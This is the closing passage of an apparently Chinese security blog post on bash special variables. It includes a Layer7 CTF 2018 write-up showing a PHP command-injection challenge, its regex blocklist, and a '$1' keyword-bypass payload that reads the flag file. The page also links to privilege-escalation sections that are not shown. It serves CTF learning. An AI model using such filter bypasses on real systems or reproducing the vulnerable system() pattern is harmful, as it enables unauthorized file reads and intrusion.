/bin:/usr/bin:/usr/local/bin:/usr/X11R6/bin:/sbin:/usr/sbin
</code></pre></div><p>环境变量<code>$PATH</code></p>
<h4 id=ps1>$PS1</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$PS1</span>
<span class=se>\s</span>-<span class=se>\v\$</span>
</code></pre></div><p>看到的命令行主要提示</p>
<h4 id=ps2>$PS2</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$PS2</span>
&gt;
</code></pre></div><p>额外输入的辅助提示，表示为<code>></code>，<code>$PS3</code>是 Shell 脚本中使用<code>select</code>时的提示符，显示为空，这里就不再单独列举了</p>
<h4 id=ps4>$PS4</h4>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash>$ <span class=nb>echo</span> <span class=nv>$PS4</span>
+
</code></pre></div><p>与<code>set -x</code>配合用来修改跟踪输出的前缀，显示为<code>+</code></p>
<h3 id=举个>举个🌰</h3>
<h4 id=layer7-ctf-2018>Layer7 CTF 2018</h4>
<p>可以访问https://cat.canhack.me/这个在线地址</p>
<h4 id=题目描述>题目描述</h4>
<pre tabindex=0><code>This service provides read the file.
https://cat.canhack.me/

This challenge was published in the Layer7 CTF in 2018.
</code></pre><h4 id=writeup>WriteUp</h4>
<p>点进去发现有</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-html data-lang=html><span class=p>&lt;</span><span class=nt>b</span><span class=p>&gt;</span>Usage<span class=p>&lt;/</span><span class=nt>b</span><span class=p>&gt;</span>: Please enter the parameter like as in <span class=p>&lt;</span><span class=nt>a</span> <span class=na>href</span><span class=o>=</span><span class=s>&#34;/?file=test.txt&#34;</span><span class=p>&gt;</span>this<span class=p>&lt;/</span><span class=nt>a</span><span class=p>&gt;</span>.
</code></pre></div><p>跟进得到<code>test.txt</code>的内容</p>
<p><figure>
<a href=https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg>
<img src=https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/https://blogpic-1254145318.cos.ap-shanghai.myqcloud.com/20190610006888.jpg loading=lazy>
</a>
</figure></p>
<p>猜测为文件包含，尝试直接读取<code>flag</code>被<code>waf</code>，直接读取<code>https://cat.canhack.me/?file=index.php</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=o>&lt;?</span><span class=nx>php</span>
	<span class=nx>error_reporting</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>

	<span class=k>require</span> <span class=no>__DIR__</span><span class=o>.</span><span class=s1>&#39;/flag-f72a161d445915d2bdcdc820c4143353.php&#39;</span><span class=p>;</span>

	<span class=k>if</span><span class=p>(</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>

		<span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s1>&#39;/flag|\&#39;|\&#34;|`|\\\\|;|\(|\)|\*|\?|\.\.|\//i&#39;</span><span class=p>,</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>])){</span>
			<span class=k>die</span><span class=p>(</span><span class=s1>&#39;no hack&#39;</span><span class=p>);</span>
		<span class=p>}</span>

		<span class=nx>system</span><span class=p>(</span><span class=s1>&#39;cat &#34;&#39;</span><span class=o>.</span><span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;file&#39;</span><span class=p>]</span><span class=o>.</span><span class=s1>&#39;&#34;&#39;</span><span class=p>);</span>

	<span class=p>}</span><span class=k>else</span><span class=p>{</span>
		<span class=k>echo</span> <span class=s1>&#39;&lt;b&gt;Usage&lt;/b&gt;: Please enter the parameter like as in &lt;a href=&#34;/?file=test.txt&#34;&gt;this&lt;/a&gt;.&#39;</span><span class=p>;</span>
	<span class=p>}</span>

</code></pre></div><p>还剩下<code>{}</code>、<code>&lt;></code>、<code>[]</code>、<code>+-=</code>、<code>^</code>、<code>$</code>、<code>@</code>、<code>!</code>、<code>&</code>，是个关键字绕过，有<code>$</code>，我们很快可以联想到可以用<code>$n</code>这种方式绕过，最终 payload</p>
<pre tabindex=0><code>https://cat.canhack.me/?file=fl$1ag-f72a161d445915d2bdcdc820c4143353.php
</code></pre><h2 id=参考>参考：</h2>
<p><a class=link href=https://www.tldp.org/LDP/abs/html/internalvariables.html target=_blank rel=noopener>Internal Variables</a></p>
<p><a class=link href=https://blog.csdn.net/whuslei/article/details/7187639 target=_blank rel=noopener>Shell中的IFS解惑</a></p>
<p><a class=link href=http://wiki.jikexueyuan.com/project/shell-tutorial/shell-special-variable.html target=_blank rel=noopener>Shell 特殊变量</a></p>
<p><a class=link href=https://xz.aliyun.com/t/2589 target=_blank rel=noopener>一个有趣的任意文件读写</a></p>
<p><a class=link href=https://www.freebuf.com/articles/system/176255.html target=_blank rel=noopener>利用通配符进行Linux本地提权</a></p>
<p><a class=link href=https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt target=_blank rel=noopener>Unix Wildcards Gone Wild</a></p>
</section>
<footer class=article-footer>
<section class=article-tags>
<a href=/tags/Sec/>Sec</a>
<a href=/tags/RCE/>RCE</a>
</section>
<section class=article-copyright><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span>
</section>
<div class="notice notice-tip">
<div class=notice-title><svg xmlns="http://www.w3.org/2000/svg" class="icon notice-icon" viewBox="0 0 512 512"><path d="M504 256A248 248 0 118 256a248 248 0 01496 0zM227 387l184-184c7-6 7-16 0-22l-22-23c-7-6-17-6-23 0L216 308l-70-70c-6-6-16-6-23 0l-22 23c-7 6-7 16 0 22l104 104c6 7 16 7 22 0z"/></svg></div>
<p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><br>
<p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://blog.zeddyu.info/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://blog.zeddyu.info/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p><br>
</div>
</footer>
</article>
<aside class=related-contents--wrapper>
<h2 class=section-title>Related contents</h2>
<div class=related-contents>
<div class="flex article-list--tile">
<article>
<a href=/2019/03/08/Web-For-Pentest/>
<div class=article-details>
<h2 class=article-title>Web For Pentest</h2>
</div>
</a>
</article>
<article>
<a href=/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/>
<div class=article-details>
<h2 class=article-title>巧用命令注入的N种方式</h2>
</div>
</a>
</article>
<article>
<a href=/2021/04/20/tls-poison/>
<div class=article-details>
<h2 class=article-title>一篇文章带你读懂 TLS Poison 攻击</h2>
</div>
</a>
</article>
<article>
<a href=/2019/12/08/HTTP-Smuggling-en/>
<div class=article-details>
<h2 class=article-title>Help you understand HTTP Smuggling in one article</h2>
</div>
</a>
</article>
<article>
<a href=/2019/12/05/HTTP-Smuggling/>
<div class=article-details>
<h2 class=article-title>一篇文章带你读懂 HTTP Smuggling 攻击</h2>
</div>
</a>
</article>
</div>
</div>
</aside>
<div class=disqus-container>
<div id=disqus_thread></div>
<script type=application/javascript>var disqus_config=function(){};(function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById('disqus_thread').innerHTML='Disqus comments not available by default when the website is previewed locally.';return}var b=document,a=b.createElement('script');a.async=!0,a.src='//ZeddYu.disqus.com/embed.js',a.setAttribute('data-timestamp',+new Date),(b.head||b.body).appendChild(a)})()</script>
<noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript>
<a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a>
</div>
<style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style>
<script>window.addEventListener('onColorSchemeChange',a=>{DISQUS&&DISQUS.reset({reload:!0})})</script>
<footer class=site-footer>
<section class=copyright>
&copy;
2018 -
2021 Zeddy's Blog
</section>
<section class=powerby>
Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> <br>
Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.2.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a>
</section>
</footer>
<div class=pswp tabindex=-1 role=dialog aria-hidden=true>
<div class=pswp__bg></div>
<div class=pswp__scroll-wrap>
<div class=pswp__container>
<div class=pswp__item></div>
<div class=pswp__item></div>
<div class=pswp__item></div>
</div>
<div class="pswp__ui pswp__ui--hidden">
<div class=pswp__top-bar>
<div class=pswp__counter></div>
<button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
<div class=pswp__preloader>
<div class=pswp__preloader__icn>
<div class=pswp__preloader__cut>
<div class=pswp__preloader__donut></div>
</div>
</div>
</div>
</div>
<div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
<div class=pswp__share-tooltip></div>
</div>
<button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
</button>
<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
</button>
<div class=pswp__caption>
<div class=pswp__caption__center></div>
</div>
</div>
</div>
</div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.css integrity="sha256-c0uckgykQ9v5k+IqViZOZKc47Jn7KQil4/MP3ySA3F8=" crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.css integrity="sha256-SBLU4vv6CA6lHsZ1XyTdhyjJxCjPif/TRkjnsyGAGnE=" crossorigin=anonymous>
</main>
<aside class="sidebar right-sidebar sticky">
<section class="widget archives">
<div class=widget-icon><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><line x1="5" y1="9" x2="19" y2="9"/><line x1="5" y1="15" x2="19" y2="15"/><line x1="11" y1="4" x2="7" y2="20"/><line x1="17" y1="4" x2="13" y2="20"/></svg>
</div>
<h2 class="widget-title section-title">Table of contents</h2>
<div class=widget--toc>
<nav id=TableOfContents>
<ol>
<li><a href=#提权>提权</a>
<ol>
<li><a href=#wildcard-wilderness>Wildcard Wilderness</a>
<ol>
<li><a href=#example-1>Example 1</a></li>
<li><a href=#example-2>Example 2</a></li>
</ol>
</li>
<li><a href=#trick>Trick</a>
<ol>
<li><a href=#file-owner-hijacking>File Owner Hijacking</a></li>
<li><a href=#chmod-file-reference>Chmod File Reference</a></li>
<li><a href=#tar命令利用>Tar命令利用</a></li>
<li><a href=#rsync命令利用>rsync命令利用</a></li>
<li><a href=#tips>Tips</a></li>
</ol>
</li>
<li><a href=#other>Other</a>
<ol>
<li><a href=#echo>Echo</a></li>
<li><a href=#ln>ln</a></li>
<li><a href=#shellshockcve-2014-6271>ShellShock(CVE-2014-6271)</a></li>
<li><a href=#从一道题看shell-shock>从一道题看Shell Shock</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#上篇的解释与补充>上篇的解释与补充</a>
<ol>
<li><a href=#特殊变量>特殊变量</a>
<ol>
<li><a href=#n>$n</a></li>
<li><a href=#ifs>$IFS</a></li>
<li><a href=#heading>$?</a></li>
<li><a href=#heading-1>$</a></li>
<li><a href=#heading-2>$#</a></li>
<li><a href=#与>$*与$@</a></li>
</ol>
</li>
<li><a href=#内置变量绕过>内置变量绕过</a>
<ol>
<li><a href=#bash>$BASH</a></li>
<li><a href=#home>$HOME</a></li>
<li><a href=#pwd>$PWD</a></li>
<li><a href=#oldpwd>$OLDPWD</a></li>
<li><a href=#path>$PATH</a></li>
<li><a href=#ps1>$PS1</a></li>
<li><a href=#ps2>$PS2</a></li>
<li><a href=#ps4>$PS4</a></li>
</ol>
</li>
<li><a href=#举个>举个🌰</a>
<ol>
<li><a href=#layer7-ctf-2018>Layer7 CTF 2018</a></li>
<li><a href=#题目描述>题目描述</a></li>
<li><a href=#writeup>WriteUp</a></li>
</ol>
</li>
</ol>
</li>
<li><a href=#参考>参考：</a></li>
</ol>
</nav>
</div>
</section>
</aside>
</div>
<script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.5/dist/vibrant.min.js integrity="sha256-5NovOZc4iwiAWTYIFiIM7DxKUXKWvpVEuMEPLzcm5/g=" crossorigin=anonymous defer></script><script type=text/javascript src=/ts/main.js defer></script>
<script>(function(){const a=document.createElement('link');a.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",a.type="text/css",a.rel="stylesheet",document.head.appendChild(a)})()</script>
</body>
</html>